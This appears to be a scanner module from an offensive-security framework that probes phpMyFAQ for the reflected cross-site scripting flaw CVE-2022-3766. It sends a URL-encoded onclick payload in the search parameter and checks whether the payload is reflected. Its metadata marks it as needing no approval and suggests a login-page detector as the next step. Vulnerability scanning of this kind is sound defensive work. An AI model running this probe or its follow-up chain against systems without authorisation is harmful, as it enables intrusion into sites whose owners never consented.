#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpMyFAQ versions prior to 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpMyFAQ < 3.1.8 - Cross-Site Scripting Detection',
        'description': "phpMyFAQ versions prior to 3.1.8 contain a reflected cross-site scripting vulnerability in the search functionality. The application fails to properly sanitize user input in the search parameter, allowing attackers to inject and execute malicious JavaScript code in the context of other users' browsers.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'phpmyfaq', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/d9666520-4ff5-43bb-aacf-50c8e5570983',
            'https://github.com/thorsten/phpMyFAQ/commit/c7904f2236c6c0dd64c2226b90c30af0f7e5a72d',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-3766',
        ],
        'cve': 'CVE-2022-3766',
    }

    def run(self):
        r = self.http_request(method="GET", path="/index.php?search=1af%22+onclick%3D'alert(document.domain)'", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('value="1af" onclick=\'alert(document.domain)\'',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="phpMyFAQ < 3.1.8 - Cross-Site Scripting detected",
                path="/index.php?search=1af%22+onclick%3D'alert(document.domain)'",
            )
            return True
        return False

